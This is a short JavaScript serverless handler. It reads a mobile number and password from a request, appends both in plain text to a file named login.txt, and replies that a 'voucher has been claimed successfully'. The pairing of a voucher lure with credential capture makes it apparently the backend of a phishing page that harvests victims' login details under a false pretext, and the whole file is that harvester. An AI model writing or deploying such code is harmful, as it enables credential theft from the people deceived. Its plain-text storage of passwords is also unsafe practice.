const fs = require('fs');
const path = require('path');

exports.handler = async (event) => {
    const mobile = event.body.mobile;
    const password = event.body.password;

    // Define the file where the data will be saved
    const filename = path.join(__dirname, 'login.txt');

    // Read the current content of the file
    let data = '';
    if (fs.existsSync(filename)) {
        data = fs.readFileSync(filename, 'utf8');
    }

    // Append the new data
    const newData = `Mobile Number: ${mobile}\nPassword: ${password}\n-----------------------------\n`;
    data += newData;

    // Write the data back to the file
    fs.writeFileSync(filename, data, 'utf8');

    return {
        statusCode: 200,
        body: 'Your voucher has been claimed successfully!',
    };
};
